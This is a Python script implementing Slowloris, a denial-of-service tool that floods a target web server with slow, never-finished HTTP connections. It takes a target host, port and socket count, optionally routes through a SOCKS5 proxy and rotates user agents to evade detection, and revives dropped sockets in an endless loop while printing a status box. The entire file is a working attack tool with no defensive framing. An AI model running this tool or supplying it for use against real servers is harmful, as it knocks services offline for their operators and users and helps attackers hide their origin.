from scapy.all import *
import socket
import os
from random import *
import argparse
import time
import sys
import socks

def main():
    setattr(socket.socket, 'send_header', send_header)

    parser = argparse.ArgumentParser(description= 'slowloris programmed in python')
    parser.add_argument("host", help="target ip", nargs = '?')
    parser.add_argument(
            '-p',
            help='host port, usually 80 for webservers',
            default=80,
            dest='port',
            type=int,
            )
    parser.add_argument(
            '-s',
            help='number of sockets to open',
            dest='sockets',
            type=int,
            required=True
            )

            
    parser.add_argument(
            "-x", "--useproxy",
            dest="useproxy",
            action="store_true",
            help="Use a SOCKS5 proxy for connecting",
            )

    parser.add_argument(
            '-H','--proxy-host',
            help='host address of SOCKS5 proxy',
            dest = 'proxyhost',
            type= str
            )

    parser.add_argument(
            '-P','--proxy-port',
            help='host port of SOCKS5 proxy',
            dest = 'proxyport',
            type=int
            )

    parser.add_argument(
            '-ua', '--user-agent', '--user-agents',
            dest='randagent',
            action="store_true",
            help='use a random user agent'
            )
    
    parser.add_argument(
            '-d', '--delay',
            dest='delay',
            help='delay between iterations',
            default = 5.0,
            type = float
            )


    
                
    sockets = []
    args = parser.parse_args()

    if args.useproxy:
        socks.setdefaultproxy(socks.PROXY_TYPE_SOCKS5, args.proxyhost, args.proxyport)
        socket.socket = socks.socksocket
    print(f'initializing {args.sockets} sockets...')
    for i in range(0, args.sockets):
        s = None
        while s == None:
            s = init_socket(args)
        sockets.append(s)

    info = [str(args.sockets), socket.gethostbyname(args.host), str(args.port), str(args.useproxy), str(args.randagent), str(args.delay)]
    while True:
        out = iteration(sockets, args)
        printbox(info, out)
        time.sleep(args.delay)
        os.system('cls')
        
        
def printbox(info, fields):
    fieldA = []
    infoA = []
    for field in fields:
        if len(field) < len('               '):
            extra = ' ' * ((len('               ')-len(field)))
            field = extra + field
            fieldA.append(field)
        else:
            fieldA.append(field)
    
    for field in info:
        if len(field) < len('               '):
            extra = ' ' * ((len('               ')-len(field)))
            field = extra + field
            infoA.append(field)
        else:
             infoA.append(field)
         
    print('------------------------------')
    print(f'|sockets used:{infoA[0]}|')
    print(f'|target      :{infoA[1]}|')
    print(f'|port        :{infoA[2]}|')
    print(f'|use proxy?  :{infoA[3]}|')
    print(f'|rand agents?:{infoA[4]}|')
    print(f'|delay (sec) :{infoA[5]}|')
    print('------------------------------')
    print(f'|dead        :{fieldA[0]}|')
    print(f'|alive       :{fieldA[1]}|')
    print(f'|headers sent:{fieldA[2]}|')
    print(f'|failed inits:{fieldA[3]}|')
    print('------------------------------')


def load_agents(name):
        agentlist = []
        with open(name, 'r') as file:
              for i in file.readlines():
                    agentlist.append(i)
        return agentlist

def send_header(self, field, option):
      self.send((f'{field}: {option}\n').encode('utf-8'))


def init_socket(args):
    
    try:
        port = args.port
        dst = socket.gethostbyname(args.host)
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect((dst, port))
        s.send((f"GET / HTTP/1.1\n").encode('utf-8'))
        s.send_header('Host', {dst})
        if args.randagent:
            agents = load_agents('agents.txt')
            s.send_header('User-Agent', choice(agents))
        return s
    except Exception as s:
        print(s)
        if args.useproxy:
            print('This likely occured due to a bad proxy.')
            sys.exit(1)
        pass
    return None
    



def iteration(list, args):
    dead = 0
    headers = 0
    failed = 0
    print(f'start of iteration...')
    print(f'sending {len(list)} headers...')
    for i in range(len(list)-1, -1, -1):
        sock = list[i]
        try:
            sock.send_header('Connection', 'keep-alive')
        except socket.error as s:
            list.remove(sock)
            dead += 1
        except Exception as s:
        
            print(f'error: {s}')
            
            continue
        else:
            headers += 1

    alive = str(len(list))

    print(f'reviving {dead} dead sockets...')
    for i in range(0, dead):
        try:
            s = init_socket(args)
            list.append(s)
        except Exception:
            print(f'socket initialization error...')
            failed += 1
            continue
    print(f'{len(list)} sockets alive...')
    print(f'end of iteration...')
    out = [str(dead), alive, str(headers), str(failed)]
    return out

main()